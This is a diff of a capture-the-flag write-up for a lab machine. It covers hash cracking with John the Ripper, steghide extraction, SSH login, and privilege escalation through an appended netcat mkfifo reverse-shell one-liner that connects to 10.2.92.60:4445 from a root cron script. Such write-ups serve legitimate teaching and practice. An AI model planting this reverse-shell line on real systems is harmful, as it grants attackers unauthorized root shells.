@@ -87,12 +87,14 @@ This looks like an encrypting algorithm. Using the hint provided by the code, we
 ![matrix-3109795_960_720](https://user-images.githubusercontent.com/93058891/154327480-ba5d1ebb-4f6a-4ba8-a836-dbefcdd7b01b.jpg)  
 Being just another image, we'll inspect the source code. In it, we find this interesting line:    
 <p>9[REDACTED]1</p>  
-Using Cyberchef, we determine that this is likely a SHA-256 hash. We'll bruteforce it with the easypeasy.txt file. We'll use this command:   
-john --wordlist=easypeasy.txt --format=gost hash.txt   
+Using Cyberchef, we determine that this is likely a SHA-256 hash. We'll bruteforce it with the easypeasy.txt file. We'll use this command:     
+   
+john --wordlist=easypeasy.txt --format=gost hash.txt
+  
 The end result provides us with a password!  
 With the password, wi then look through the directory to find a jpg file. We'll crack it using steghide. Upon Cracking, we find a secrettext.txt file. lets open that. The file contains a username and a binary encoded password. Let's decode it! 
 Now with the username and password in hand, lets login with ssh:    
-ssh -p 6498 boring@10.10.66.29  
+ssh -p 6498 boring@10.10.153.96    
 Now inside the box, we find the user.txt file in the home directory. Something seems wrong with it though...  
 User Flag But It Seems Wrong Like It's Rotated Or Something  
 synt{REDACTED}  
@@ -121,7 +123,9 @@ drwxr-xr-x  4 root   root   4096 Jun 15  2020 html
 -rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh  
 
 It is! This means we can use it to spawn a root shell using netcat. We'll edit the fie with this command:  
-echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.92.60 4445 >/tmp/f" >> /var/www/.mysecretcronjob.sh 
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.92.60 4445 >/tmp/f" >> /var/www/.mysecretcronjob.sh  
+
 Now on our own machine we type:  
 nc -lvnp 4445  
 This should give us a root shell. Once we're in, all we need to do is run:  
